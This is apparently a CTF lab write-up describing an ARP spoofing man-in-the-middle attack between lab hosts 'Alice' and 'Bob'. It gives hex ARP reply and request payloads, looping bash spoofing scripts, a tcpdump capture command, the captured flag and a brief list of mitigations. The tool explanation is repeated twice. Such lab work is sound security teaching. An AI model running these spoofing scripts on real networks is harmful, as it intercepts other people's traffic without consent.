# ARP Spoofing Attack Using `raw_packet`

## Overview
This document explains how I performed an **ARP spoofing attack** using the `raw_packet` tool to intercept communication between two devices, **Alice** and **Bob**, and act as a **Man-in-the-Middle (MITM)**. By capturing network traffic, I successfully extracted a **CTF flag** from their communication.

---

## Explanation of `raw_packet` Program

The `raw_packet` program creates and sends a single Ethernet frame over a specified network interface. The frame structure is as follows:

```
##############################################################
# dst addr | src addr | payloadproto | ------ payload ------ #
##############################################################
```

### **Purpose**
The program builds a raw Ethernet frame with:
- **Destination MAC Address (dst addr):** Target device's MAC address.
- **Source MAC Address (src addr):** Automatically set by the OS.
- **Payload Protocol Type (payloadproto):** Specifies the payload type (e.g., ARP).
- **Payload:** Data transmitted, read from a file.

### **Command-Line Arguments**
The program requires four arguments:
1. `iface` - Network interface (e.g., `eth0` or `eth1`).
2. `destination` - Target MAC address (`xx:xx:xx:xx:xx:xx`).
3. `payloadproto` - Protocol type (e.g., `0x0806` for ARP).
4. `payloadfile` - File containing the payload.

#### **Example Command**
```bash
sudo raw_packet eth1 02:42:0a:0a:28:02 0x0806 alice_bonus.bin
```
### **Purpose**
The program builds a raw Ethernet frame with the following components:

Destination MAC Address (dst addr): The target device's MAC address.
Source MAC Address (src addr): Automatically set by the operating system.
Payload Protocol Type (payloadproto): Indicates the type of payload being sent (e.g., IP, ARP, or custom protocols).
Payload: The actual data to be transmitted, read from a file.
The program sends the constructed frame through the specified network interface.

### **Command-Line Arguments**
The program expects four arguments when it is run:

iface: The name of the network interface to use, such as eth0 or eth1.
destination: The destination MAC address in the format xx:xx:xx:xx:xx:xx.
payloadproto: The protocol type for the payload (e.g., 0x0806 for ARP).
payloadfile: A file containing the data to be used as the payload.
Example Command

sudo raw_packet eth1 02:42:0a:0a:28:02 0x0806 alice_bonus.bin

argv[0]: "raw_packet" (the program name)
argv[1]: "eth1" (the network interface to use)
argv[2]: "02:42:0a:0a:28:02" (the target MAC address)
argv[3]: "0x0806" (protocol type, ARP in this case)
argv[4]: "alice_bonus.bin" (file containing the payload)
Code Walkthrough

### **Input Validation**
The program checks that exactly four arguments are provided.
It verifies that the interface name is valid and does not exceed 16 bytes (IFNAMSIZ).
The MAC address format is validated to ensure it follows xx:xx:xx:xx:xx:xx.
It checks that the protocol type starts with "0x" to confirm it’s in hexadecimal format.

### **Steps in Detail** 
**Parse the Destination MAC Address:**

The MAC address is split into its six components (e.g., 02:42:0a:0a:28:02) and converted into a 6-byte array using strtok and strtol.

We need to tokenize the MAC address in this program because it is provided as a string in a human-readable format (e.g., "02:42:0a:0a:28:02") but needs to be converted into a binary representation (raw bytes) for use in the Ethernet frame.

**Read the Payload File:**

The program opens the specified payload file.
It checks the file size to ensure it doesn’t exceed the Ethernet frame’s maximum capacity.
The payload data is then read into a buffer.


**Create a Raw Socket:**

A raw socket is created using socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ALL)).
This allows the program to directly work with Layer 2 Ethernet frames.
Bind the Socket to the Network Interface:

The interface index is retrieved using an ioctl call with the SIOCGIFINDEX flag.
The sockaddr_ll structure is filled with:
The interface index.
The destination MAC address.
The protocol type for the payload.

**Send the Ethernet Frame:**

The program sends the constructed frame using the sendto system call, which sends the payload to the specified destination.

**Clean Up:**

After the frame is sent, the program closes the file and socket to release resources.

**Key Structures and Definitions**

IFNAMSIZ: Defined in <linux/if.h>, it specifies the maximum size of a network interface name (16 bytes, including the null terminator).
sockaddr_ll: A low-level structure used for sending Layer 2 Ethernet frames.
Important fields include:
sll_family: Specifies Layer 2 (PF_PACKET).
sll_protocol: The protocol type (e.g., 0x0806 for ARP).
sll_ifindex: The index of the network interface.
sll_addr: The destination MAC address.
sll_halen: Length of the MAC address (6 bytes).

**Example Usage**

sudo raw_packet eth1 02:42:0a:0a:28:02 0x0806 alice_bonus.bin

eth1: The network interface used to send the frame.
02:42:0a:0a:28:02: The target MAC address to which the frame will be sent.
0x0806: Protocol type indicating the payload is an ARP packet.
alice_bonus.bin: A file containing the data to send as the payload.

**Notes**

Root Privileges:

The program must be run as root because raw sockets require elevated permissions.

Payload Size:

Ensure the payload size does not exceed the Ethernet frame's maximum payload capacity of 1500 bytes (excluding the header).

Error Handling:

The program will print error messages and terminate if there are issues with inputs or system calls.

---

## Steps in Detail

### **1. Preparing the Environment**

#### **Crafting ARP Payloads**
I crafted two payloads to spoof ARP requests:

**Alice's Payload (`alice_payload.hex`):**
Sent to **Alice**, pretending to be **Bob**:
```
00 01 08 00 06 04 00 02
02 42 0a 0a 28 04 0a 0a 28 03
02 42 0a 0a 28 02 0a 0a 28 02
```

**Bob's Payload (`bob_payload.hex`):**
Sent to **Bob**, pretending to be **Alice**:
```
00 01 08 00 06 04 00 02
02 42 0a 0a 28 04 0a 0a 28 02
02 42 0a 0a 28 03 0a 0a 28 03
```

#### **Converting Payloads to Binary**
```bash
xxd -r -p alice_payload.hex alice_payload.bin
xxd -r -p bob_payload.hex bob_payload.bin
```

---

### **2. Writing the Spoofing Script**
To automate the attack, I wrote a Bash script (`spoofing.sh`):
```bash
#!/bin/bash
while true; do
    sudo raw_packet eth1 02:42:0a:0a:28:03 0x0806 bob_payload.bin
    sudo raw_packet eth1 02:42:0a:0a:28:02 0x0806 alice_payload.bin
    sleep 1
done
```
Make the script executable:
```bash
chmod +x spoofing.sh
```

---

### **3. Performing the Attack**

#### **Running the Spoofing Script**
```bash
sudo ./spoofing.sh
```

#### **Generating Network Traffic**
I generated traffic between **Alice** and **Bob**:
```bash
ping <alice_ip>
ping <bob_ip>
```

#### **Capturing Traffic**
Using `tcpdump` to monitor traffic:
```bash
sudo tcpdump -i eth1 -n -XX
```
- `-i eth1`: Interface used for the attack.
- `-n`: Disables name resolution.
- `-XX`: Displays packet data in hex and ASCII.

---

### **4. Analyzing the Traffic**
From the captured packets, I extracted the **CTF flag**:
```
CTF{secret-Fe7Dsr2rYfcuhQFvskXl}
```

---

## Bonus Task: Using ARP Requests

### **Crafting Bonus Payloads**
Instead of ARP replies, I used ARP **requests**.

**Alice's Bonus Payload (`alice_bonus.hex`):**
Sent as an ARP request, pretending **Mallory** is **Bob**:
```
00 01 08 00 06 04 00 01
02 42 0a 0a 28 04 0a 0a 28 03
00 00 00 00 00 00 0a 0a 28 02
```

**Bob's Bonus Payload (`bob_bonus.hex`):**
Sent as an ARP request, pretending **Mallory** is **Alice**:
```
00 01 08 00 06 04 00 01
02 42 0a 0a 28 04 0a 0a 28 02
00 00 00 00 00 00 0a 0a 28 03
```


**Why Target MAC Address is Zeros in ARP Requests**

When crafting the ARP requests, I set the **target MAC address** to zeros (00:00:00:00:00:00). Here’s why:

ARP requests are meant to discover the MAC address for a given IP address.
Since I don’t know the target MAC address initially, setting it to zeros is the correct behavior.
Protocol Compliance:
According to the **ARP protocol**, requests must:
Include the **sender's MAC and IP addresses**.
Include the target's IP address but leave the target's MAC address as zeros.

#### **Converting Payloads to Binary**
```bash
xxd -r -p alice_bonus.hex alice_bonus.bin
xxd -r -p bob_bonus.hex bob_bonus.bin
```

---

### **Bonus Script**
```bash
#!/bin/bash
while true; do
    sudo raw_packet eth1 02:42:0a:0a:28:02 0x0806 alice_bonus.bin
    sudo raw_packet eth1 02:42:0a:0a:28:03 0x0806 bob_bonus.bin
    sleep 1
done
```
Make it executable:
```bash
chmod +x bonus.sh
```

#### **Running the Bonus Attack**
```bash
sudo ./bonus.sh
```

Captured traffic revealed the same **CTF flag**.

---

## **Why ARP Requests Work**
- ARP requests are **trusted** by most devices.
- Devices **automatically update** their ARP tables upon receiving ARP requests.
- **Target MAC Address** is set to `00:00:00:00:00:00` because the sender doesn’t initially know the target MAC.

---

## **Mitigations**
To prevent ARP spoofing attacks:
1. **Static ARP Entries:** Prevent ARP table updates.
2. **Dynamic ARP Inspection (DAI):** Validate ARP packets on network switches.
3. **Encrypted Communication:** Use HTTPS or VPNs.
4. **ARP Table Validation:** Detect spoofing attempts.

---

## **Conclusion**
Both the main and bonus tasks were successful:
- Traffic between **Alice** and **Bob** was redirected through **Mallory**.
- I captured the **CTF flag**: `CTF{secret-Fe7Dsr2rYfcuhQFvskXl}`.

By automating ARP payload delivery and analyzing intercepted packets, I demonstrated the effectiveness of ARP spoofing for MITM attacks.
